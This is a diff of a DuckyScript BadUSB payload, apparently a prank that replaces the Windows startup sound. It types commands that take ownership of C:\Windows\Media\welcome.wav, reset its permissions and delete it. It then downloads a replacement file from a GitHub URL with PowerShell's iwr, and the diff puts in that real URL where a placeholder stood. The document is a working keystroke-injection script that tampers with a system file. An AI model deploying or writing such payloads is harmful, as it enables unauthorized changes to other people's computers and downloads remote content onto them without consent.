@@ -26,5 +26,5 @@ DELAY 1500
 STRING cd C:\Windows\Media && takeown /f welcome.wav /r /a /d y && icacls welcome.wav /inheritance:r /grant:r administrators:(F) /t & del /f /q welcome.wav && exit
 ENTER
 DELAY 500
-STRING cd C:\Windows\Media ;; iwr -Uri 'linkto.wav' -OutFile welcome.wav ;; exit
+STRING cd C:\Windows\Media ;; iwr -Uri 'https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/prank/Win/Starup_Sound_Troll/LN.wav' -OutFile welcome.wav ;; exit
 ENTER
